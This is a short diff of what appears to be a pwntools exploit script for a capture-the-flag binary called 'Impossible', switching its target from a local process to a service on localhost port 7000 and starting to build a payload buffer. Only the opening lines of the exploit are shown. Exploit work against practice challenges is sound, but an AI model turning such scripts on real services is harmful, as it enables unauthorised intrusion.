@@ -1,6 +1,6 @@
 from pwn import *
 
-r = process("./Impossible")
+r = remote("localhost", 7000)
 
 buf = b'12345'
 buf += b'\x00' * 3
